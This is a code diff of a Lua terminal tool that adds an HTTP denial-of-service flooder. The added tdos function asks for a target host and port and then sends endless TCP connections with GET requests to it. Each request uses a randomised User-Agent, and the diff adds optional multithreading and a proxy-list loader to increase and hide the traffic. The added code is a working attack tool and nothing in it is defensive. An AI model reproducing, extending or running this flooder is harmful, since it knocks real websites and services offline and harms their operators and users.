@@ -10,18 +10,23 @@ local config_content = [[
 
 local m = {}
 
-m.defaultmode = 1 -- [ note: 1 for cli, 2 for tui ]
+m.defaultmode = 2 -- [ note: 1 for cli, 2 for tui ]
 
 m.ESC = "Hexadecimal" -- [ note: On different OS have their own ANSI Escape can be change to ]
                       -- [ "Octal", "Ctrl-Key", "Unicode", "Hexadecimal", "Decimal"          ]
                       -- ANSI Escape Sequences doc : https://gist.github.com/ConnerWill/d4b6c776b509add763e17f9f113fd25b
                       -- on unix can be check via echo $COLORTERM or just env and scroll
                       -- edit if weird
+
+--dos
+m.useproxies = false -- skip proxies txt to lua convert if false
+m.uselanes = false -- multithread note: this clogs up thread so fast
             
 return m
 ]] -- og from config.lua
 
 local config
+local proxies
 
 local function file_exists(path)
     local f = io.open(path, "r")
@@ -45,10 +50,41 @@ else
         print("Error creating config file: " .. tostring(err))
     end
 end
+if config.useproxies then
 
+local input_filename = "http.txt"
+local output_filename = "proxies.lua"
+local input_file, err = io.open(input_filename, "r")
+if not input_file then
+    print("Error opening input file: " .. tostring(err).."skipping")
+    return
+end
+local output_file, err = io.open(output_filename, "w")
+if not output_file then
+    print("Error opening output file: " .. tostring(err))
+    input_file:close()
+    return
+end
+output_file:write("local proxies = {\n")
+for line in input_file:lines() do
+    local clean_line = line:match("^%s*(.-)%s*$")
+    if clean_line ~= "" then
+        clean_line = clean_line:gsub('"', '\\"')
+        output_file:write(string.format('    "%s",\n', clean_line))
+    end
+end
+output_file:write("}\n\nreturn proxies\n")
+input_file:close()
+output_file:close()
+
+proxies = require("proxies")
+end
 local colord = require("colord")
 local prettytext = require("prettytext")
 local socket = require('socket')
+local useragent = require("useragent")
+local lanes = require("lanes").configure()
+
 local branding = [[
                    _                                     
           ' )   _/                               
@@ -66,7 +102,6 @@ local function warn(text)
     io.flush()
 end
 
-
 -- ================================voids=================================
 --[[
     the tui functions start with t ex. tdos
@@ -77,10 +112,44 @@ local function tdos()
     colord:erasesavedL()
     colord:eraseall()
     io.write(colord:cursorinvis())
-    warn(socket._VERSION.."\n")
     io.write("Target : ")
-    local input = io.read()
+    local inputhost = io.read()
+    io.write("Port (note: http = 80, *https = 443) : ")
+    local inputport = io.read()
+    if tonumber(inputport) == nil then inputport = 443 end
+    if config.uselanes then
+        while true do
+            if config.useproxies then
+                print("proxies")
+            else
+                lanes.gen("*", function()
+                    local socket = require("socket")
+                    local useragent = require("useragent")
+                    for i = 1, 10 do
+                        local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                        tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
+                        tcp:close()
+                        io.write("send ".. inputhost.."\n")
+                    end
+                end)()
+            end
+        end
+        else
+            while true do
+                if config.useproxies then
+                    print("proxies")
+                else
+                    for i = 1, 10 do
+                        local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                        tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
+                        tcp:close()
+                        io.write("send ".. inputhost.."\n")
+                    end
+                end
+            end
+    end
 end
+
 
 local function exit() -- exit and clean up
     colord:reset()
@@ -130,6 +199,7 @@ local function tui()
             count = count + 1
             table.insert(idn,i)
         end
+        io.write("choice:")
         local input = io.read()
         if tonumber(input) == nil then
             warn("numbers please.\n")
